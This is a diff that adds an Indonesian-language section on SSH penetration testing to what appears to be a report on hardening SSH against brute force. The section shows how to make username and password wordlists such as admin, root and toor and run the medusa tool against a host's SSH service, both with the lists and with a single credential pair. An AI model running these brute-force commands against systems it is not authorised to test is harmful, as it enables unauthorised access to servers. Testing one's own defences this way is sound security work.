@@ -346,6 +346,58 @@ Rule diatas akan memblock host setelah melakukan percobaan yang salah sebanyak 4
 
 ### 3. Langkah Uji Penetrasi dengan SSH Brute Force Tools
 
+#### 3.1 Medusa
 
+Untuk melakukan serangan secara brute force terhadap sebuah server menggunakan tools medusa diharuskan memiliki daftar username serta password untuk dicoba secara brute force sampai didapatkan username dan password yang cocok.
+
+Langkah awal dibuat terlebih dahulu daftar username untuk dicoba
+
+```
+cat > username.txt
+```
+
+Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar username yang ingin dicoba diantaranya adalah
+
+```
+aloha
+admin
+root
+toor
+administrator
+ubuntuserver
+```
+
+Selanjutnya dibuatkan daftar password yang akan dicoba
+
+```
+cat > password.txt
+```
+
+Setelah syntax diatas dijalankan maka user tinggal memasukkan daftar password yang ingin dicoba diantaranya adalah
+
+```
+admin
+administrator
+root
+toor
+tes
+qwerty
+```
+
+Setelah membuat daftar username serta password yang akan digunakan dalam melakukan brute force attack. Attacker pun harus mengetahui ip dari host yang akan di attack, selanjutnya dijalan syntax seperti dibawah ini
+
+```
+medusa -h IP HOST -U username.txt -P password.txt -M ssh
+```
+
+Syntax yang digunakan bisa seperti diatas apabila attacker memiliki daftar username serta password, namun bila attacker ingin mencoba melakukan attack dengan menggunakan satu username serta satu password bisa menggunakan syntax 
+
+```
+medusa -h IP HOST -u "admin" -p "admin" -M ssh
+```
+
+Dengan syntax diatas maka attacker melakukan attack dengan mencoba username admin serta password admin
+
+Apabilan berhasil maka medusa akan memberikan feedback berupa username dan password yang digunakan oleh server seperti gambar dibawah ini
 
 # E. Kesimpulan dan Saran
